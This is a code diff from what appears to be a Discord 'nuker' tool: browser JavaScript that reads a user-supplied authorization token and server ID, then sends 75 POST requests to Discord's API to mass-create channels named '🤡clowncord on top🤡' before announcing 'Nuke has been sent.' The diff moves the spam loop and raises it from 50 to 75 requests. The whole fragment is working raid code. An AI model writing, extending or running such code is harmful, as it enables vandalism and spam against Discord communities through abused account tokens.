@@ -68,19 +68,21 @@
               xxhr.send(null);
               console.log(xxhr.responseText)
               }
+              
+              for (i = 0; i < 75; i++) {
+                let xhr = new XMLHttpRequest();
+                var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
+                var params = {"type":0,"name":"🤡clowncord on top🤡"}
+
+                xhr.open("POST", url, true);
+
+                xhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
+                xhr.setRequestHeader('Content-Type', 'application/json')
+
+                xhr.send(JSON.stringify(params));
+              }
             }
-          for (i = 0; i < 50; i++) {
-            let xhr = new XMLHttpRequest();
-            var url = "https://discord.com/api/v8/guilds/"+ document.getElementById("inputServer").value+"/channels";
-            var params = {"type":0,"name":"🤡clowncord on top🤡"}
-
-            xhr.open("POST", url, true);
-
-            xhr.setRequestHeader("authorization", document.getElementById("inputToken").value);
-            xhr.setRequestHeader('Content-Type', 'application/json')
-
-            xhr.send(JSON.stringify(params));
-          }
+      
           alert("Nuke has been sent.")
          }
          else
